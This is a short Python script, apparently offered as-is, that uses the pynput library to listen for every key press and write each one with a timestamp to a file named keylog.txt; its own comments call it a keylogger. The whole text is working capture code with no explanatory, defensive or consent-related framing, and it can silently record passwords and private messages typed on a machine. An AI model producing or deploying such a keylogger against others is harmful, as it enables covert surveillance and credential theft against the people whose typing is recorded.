from pynput import keyboard
import time

# Create a file to store the keystrokes
file = open("keylog.txt", "w")

def key_press(key):
    # Get the current time and format it as a string
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    # Write the timestamp and the key to the file
    file.write(f"{timestamp} - {key}\n")
    file.flush()

# Start the keylogger
with keyboard.Listener(on_press = key_press) as listener:
    listener.join()

# Close the file
file.close()